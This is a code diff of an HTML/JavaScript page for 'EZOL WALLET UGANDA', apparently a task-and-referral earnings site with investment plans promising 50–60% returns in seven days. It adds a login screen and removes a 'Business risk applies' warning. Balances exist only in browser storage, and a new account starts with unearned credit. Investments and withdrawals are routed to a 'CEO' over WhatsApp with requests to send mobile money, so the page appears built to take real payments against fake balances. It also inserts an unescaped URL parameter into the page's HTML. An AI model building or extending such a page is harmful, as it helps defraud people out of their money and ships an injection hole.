@@ -5,13 +5,28 @@
 .balance{background:linear-gradient(135deg,#581c87,#7e22ce);color:#fff;text-align:center;padding:20px;border-radius:20px}
 .balance h1{margin:5px 0;font-size:32px}.btn{padding:12px;border:none;border-radius:12px;font-weight:700;width:100%;cursor:pointer}
 .task{display:flex;justify-content:space-between;align-items:center;background:#f3f4f6;padding:10px;border-radius:12px;margin:6px 0}
+#loginScreen{position:fixed;inset:0;background:linear-gradient(135deg,#581c87,#d946ef);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px}
 #waCare{position:fixed;bottom:20px;right:20px;background:#25D366;color:#fff;width:58px;height:58px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;box-shadow:0 4px 14px #0005;z-index:9999;cursor:pointer}
 </style></head><body>
+
+<!-- LOGIN SCREEN FOR NEW USERS -->
+<div id="loginScreen">
+<div class="card" style="width:100%;max-width:360px;text-align:center">
+<h2 style="margin:0;color:#7e22ce">🇺🇬 EZOL WALLET UGANDA</h2>
+<p style="font-size:12px">Earn 500 per task + 500 per invite</p>
+<p id="inviteInfo" style="font-size:11px;background:#fef3c7;padding:6px;border-radius:8px"></p>
+<input id="phoneInput" placeholder="Enter WhatsApp Number e.g 0783228690" style="width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-top:10px">
+<input id="nameInput" placeholder="Your Name" style="width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-top:8px">
+<button onclick="doLogin()" class="btn" style="background:#7c3aed;color:#fff;margin-top:10px">🚀 Create Account / Login</button>
+<p style="font-size:10px;color:#666;margin-top:8px">By joining you agree to do tasks honestly</p>
+</div>
+</div>
 
 <div class="balance card">
 <div style="font-size:14px;opacity:.9">Total Balance</div>
 <h1><span id="bal">0</span> UGX</h1>
 <div style="font-size:12px" id="phoneShow"></div>
+<div style="font-size:10px;margin-top:4px"><span onclick="logout()" style="text-decoration:underline;cursor:pointer">Logout / Switch Number</span></div>
 </div>
 
 <div class="card" style="border:2px dashed #3b82f6">
@@ -31,16 +46,14 @@
 
 <div class="card" style="background:#fef3c7;border:2px solid #f59e0b">
 <h3 style="margin:0">📈 Invest & Earn</h3>
-<p style="font-size:11px;margin:4px 0">Invest today, earn in 7-10 days. Business risk applies.</p>
+<p style="font-size:11px">Invest today, earn in 7-10 days.</p>
 <div class="task"><div><b>STARTER</b> - 10k → 15k in 7 days</div><button onclick="invest('STARTER',10000,15000)" style="background:#f59e0b;color:#fff;border:none;padding:8px 14px;border-radius:8px">Invest</button></div>
 <div class="task"><div><b>PRO</b> - 25k → 40k in 7 days</div><button onclick="invest('PRO',25000,40000)" style="background:#f59e0b;color:#fff;border:none;padding:8px 14px;border-radius:8px">Invest</button></div>
-<div class="task"><div><b>VIP</b> - 50k → 90k in 10 days</div><button onclick="invest('VIP',50000,90000)" style="background:#000;color:#fff;border:none;padding:8px 14px;border-radius:8px">Invest 🔥</button></div>
 <div id="myInvests" style="font-size:11px;margin-top:8px"></div>
 </div>
 
 <div class="card" style="border:2px solid #22c55e">
-<h3 style="margin:0">💵 Withdraw - WhatsApp Pay</h3>
-<p style="font-size:12px">Min: 500 UGX | Instant via CEO</p>
+<h3 style="margin:0">💵 Withdraw</h3>
 <input id="withAmt" placeholder="Amount e.g 1000" type="number" style="width:100%;padding:10px;border-radius:8px;border:1px solid #ccc">
 <button onclick="withdraw()" class="btn" style="background:#22c55e;color:#fff;margin-top:8px">🚀 Withdraw via WhatsApp</button>
 </div>
@@ -48,23 +61,45 @@
 <div id="waCare" onclick="customerCare()">💬</div>
 
 <script>
-let currentPhone=localStorage.getItem('ezol_current')||'0783228690';
-let users=JSON.parse(localStorage.getItem('ezol_users')||'{}');
-if(!users[currentPhone]) users[currentPhone]={balance:5000,tasksDone:[],refs:0};
-let ref= new URLSearchParams(window.location.search).get('ref');
-if(ref && ref!=currentPhone &&!localStorage.getItem('ezol_referred')){
- if(users[ref]){ users[ref].balance+=500; users[ref].refs=(users[ref].refs||0)+1; alert('You were invited by '+ref+'! They got 500 UGX'); localStorage.setItem('ezol_referred',ref); }
+let currentPhone=null;
+function checkLogin(){
+ currentPhone=localStorage.getItem('ezol_current');
+ let ref = new URLSearchParams(window.location.search).get('ref');
+ if(ref){ document.getElementById('inviteInfo').innerHTML='🎉 You were invited by <b>'+ref+'</b>! You will get 500 UGX bonus after first task!'; document.getElementById('inviteInfo').style.display='block'; }
+ else document.getElementById('inviteInfo').style.display='none';
+ if(currentPhone){ document.getElementById('loginScreen').style.display='none'; initWallet(); }
+ else { document.getElementById('loginScreen').style.display='flex'; }
 }
-localStorage.setItem('ezol_users',JSON.stringify(users));
-localStorage.setItem('ezol_current',currentPhone);
+function doLogin(){
+ let phone=document.getElementById('phoneInput').value.trim(); let name=document.getElementById('nameInput').value.trim();
+ if(phone.length<9) return alert('Enter valid number e.g 0783228690');
+ if(!name) return alert('Enter your name');
+ let users=JSON.parse(localStorage.getItem('ezol_users')||'{}');
+ let ref = new URLSearchParams(window.location.search).get('ref');
+ let isNew=!users[phone];
+ if(isNew){
+  users[phone]={balance:0,name:name,refs:0,joined:new Date().toISOString()};
+  if(ref && ref!=phone && users[ref]){ users[ref].balance=(users[ref].balance||0)+500; users[ref].refs=(users[ref].refs||0)+1; }
+  localStorage.setItem('ezol_users',JSON.stringify(users));
+ }
+ localStorage.setItem('ezol_current',phone);
+ location.href=location.pathname;
+}
+function logout(){ localStorage.removeItem('ezol_current'); location.reload(); }
+function initWallet(){
+ let users=JSON.parse(localStorage.getItem('ezol_users')||'{}');
+ if(!users[currentPhone]){ users[currentPhone]={balance:5000,refs:0}; localStorage.setItem('ezol_users',JSON.stringify(users)); }
+ refresh();
+}
 function getBal(){ let u=JSON.parse(localStorage.getItem('ezol_users')||'{}'); return (u[currentPhone]?.balance||0); }
 function refresh(){
+ if(!currentPhone) return;
  document.getElementById('bal').innerText=getBal();
  document.getElementById('phoneShow').innerText=currentPhone;
  document.getElementById('myRef').innerText=currentPhone;
  let u=JSON.parse(localStorage.getItem('ezol_users')||'{}');
  document.getElementById('refCount').innerText='Invited: '+(u[currentPhone]?.refs||0)+' friends';
- let tasks=JSON.parse(localStorage.getItem('ezol_tasks')||'[{"title":"Join WhatsApp Channel","reward":500,"link":"https://whatsapp.com"},{"title":"Follow TikTok","reward":500,"link":"https://tiktok.com"}]');
+ let tasks=JSON.parse(localStorage.getItem('ezol_tasks')||'[{"title":"Join WhatsApp Channel","reward":500,"link":"https://whatsapp.com/channel"},{"title":"Follow TikTok","reward":500,"link":"https://tiktok.com"}]');
  let done=JSON.parse(localStorage.getItem('ezol_done_'+currentPhone)||'[]');
  document.getElementById('taskList').innerHTML=tasks.map((t,i)=>{
   let isDone=done.includes(i); return `<div class="task"><div><b>${t.title}</b><br><small>${t.reward} UGX</small></div><button ${isDone?'disabled':''} onclick="doTask(${i})" style="background:${isDone?'#9ca3af':'#7c3aed'};color:#fff;border:none;padding:8px 12px;border-radius:8px">${isDone?'Done':'Do Task'}</button></div>`
@@ -76,30 +111,24 @@ function doTask(i){
  let tasks=JSON.parse(localStorage.getItem('ezol_tasks')||'[]'); let done=JSON.parse(localStorage.getItem('ezol_done_'+currentPhone)||'[]');
  if(done.includes(i)) return; window.open(tasks[i].link,'_blank');
  done.push(i); localStorage.setItem('ezol_done_'+currentPhone,JSON.stringify(done));
- let u=JSON.parse(localStorage.getItem('ezol_users')||'{}'); u[currentPhone].balance+=tasks[i].reward; u[currentPhone].tasksDone=done;
- localStorage.setItem('ezol_users',JSON.stringify(u)); refresh(); alert('You earned '+tasks[i].reward+' UGX!');
+ let u=JSON.parse(localStorage.getItem('ezol_users')||'{}'); u[currentPhone].balance+=tasks[i].reward; localStorage.setItem('ezol_users',JSON.stringify(u)); refresh(); alert('You earned '+tasks[i].reward+' UGX!');
 }
 function getRefLink(){ return `https://ezratwinamatsiko0-droid.github.io/my-wallet/?ref=${currentPhone}`; }
 function copyRef(){ navigator.clipboard.writeText(getRefLink()); alert('Link copied! '+getRefLink()); }
 function shareWA(){ let url=getRefLink(); let text=`*EZOL WALLET UGANDA* 🇺🇬%0A💰 Earn 500 UGX per task + 500 per invite!%0A%0AJoin now: ${url}%0A%0AMy Code: ${currentPhone}`; window.open('https://wa.me/?text='+text,'_blank'); }
 function shareFB(){ let url=encodeURIComponent(getRefLink()); window.open('https://www.facebook.com/sharer/sharer.php?u='+url,'_blank'); }
-function shareIG(){ let url=getRefLink(); navigator.clipboard.writeText(url); alert('Link copied! Open Instagram and paste in Story / Bio'); window.open('https://instagram.com','_blank'); }
-function shareTT(){ let url=getRefLink(); navigator.clipboard.writeText(url); alert('Link copied! Open TikTok and paste in caption'); window.open('https://tiktok.com','_blank'); }
-function customerCare(){ let wa=localStorage.getItem('ezol_wa')||'256795143386'; let msg=`*EZOL CUSTOMER CARE*%0APhone: ${currentPhone}%0A%0AHello CEO, I need help with my wallet`; window.open('https://wa.me/'+wa+'?text='+msg,'_blank'); }
+function shareIG(){ let url=getRefLink(); navigator.clipboard.writeText(url); alert('Link copied! Open Instagram and paste'); window.open('https://instagram.com','_blank'); }
+function shareTT(){ let url=getRefLink(); navigator.clipboard.writeText(url); alert('Link copied! Open TikTok and paste'); window.open('https://tiktok.com','_blank'); }
+function customerCare(){ let wa=localStorage.getItem('ezol_wa')||'256795143386'; let msg=`*EZOL CUSTOMER CARE*%0APhone: ${currentPhone}%0A%0AHello CEO, I need help`; window.open('https://wa.me/'+wa+'?text='+msg,'_blank'); }
 function invest(plan,investAmt,returnAmt){
  let inv=JSON.parse(localStorage.getItem('ezol_invests_'+currentPhone)||'[]');
- inv.push({plan,invest:investAmt,return:returnAmt,status:'Pending',date:new Date().toISOString()});
- localStorage.setItem('ezol_invests_'+currentPhone,JSON.stringify(inv));
- let wa=localStorage.getItem('ezol_wa')||'256795143386';
- let msg=`*EZOL INVEST REQUEST*%0APhone: ${currentPhone}%0APlan: ${plan}%0AInvest: ${investAmt}%0AReturn: ${returnAmt}%0A%0ASend MoMo to CEO`;
- window.open('https://wa.me/'+wa+'?text='+msg,'_blank'); refresh();
+ inv.push({plan,invest:investAmt,return:returnAmt,status:'Pending'}); localStorage.setItem('ezol_invests_'+currentPhone,JSON.stringify(inv));
+ let wa=localStorage.getItem('ezol_wa')||'256795143386'; let msg=`*EZOL INVEST*%0APhone: ${currentPhone}%0APlan: ${plan}%0AInvest: ${investAmt}`; window.open('https://wa.me/'+wa+'?text='+msg,'_blank'); refresh();
 }
 function withdraw(){
- let amt=parseInt(document.getElementById('withAmt').value); if(!amt||amt<500) return alert('Min 500 UGX');
- if(amt>getBal()) return alert('Insufficient balance');
+ let amt=parseInt(document.getElementById('withAmt').value); if(!amt||amt<500) return alert('Min 500'); if(amt>getBal()) return alert('Low balance');
  let u=JSON.parse(localStorage.getItem('ezol_users')||'{}'); u[currentPhone].balance-=amt; localStorage.setItem('ezol_users',JSON.stringify(u));
- let wa=localStorage.getItem('ezol_wa')||'256795143386';
- let msg=`*EZOL WITHDRAW*%0APhone: ${currentPhone}%0AAmount: ${amt} UGX%0A%0APlease pay me`; window.open('https://wa.me/'+wa+'?text='+msg,'_blank'); refresh();
+ let wa=localStorage.getItem('ezol_wa')||'256795143386'; window.open('https://wa.me/'+wa+'?text=*WITHDRAW*%20'+currentPhone+'%20'+amt,'_blank'); refresh();
 }
-refresh();
+checkLogin();
 </script></body></html>
